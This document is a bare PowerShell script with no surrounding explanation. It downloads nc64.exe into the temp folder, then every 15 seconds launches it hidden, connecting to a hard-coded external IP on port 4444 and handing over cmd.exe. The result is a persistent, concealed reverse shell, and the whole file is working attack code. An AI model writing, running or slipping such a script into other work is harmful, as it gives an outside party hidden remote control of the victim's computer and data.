$listenerIP = '93.123.83.241'
$port = 4444 
$ncUrl = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'
$ncPath = "$env:TEMP\nc.exe" 
If (-Not (Test-Path $ncPath)) {
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
}
while ($true) {
        Start-Process $ncPath -ArgumentList "$listenerIP $port -e cmd.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 15
}


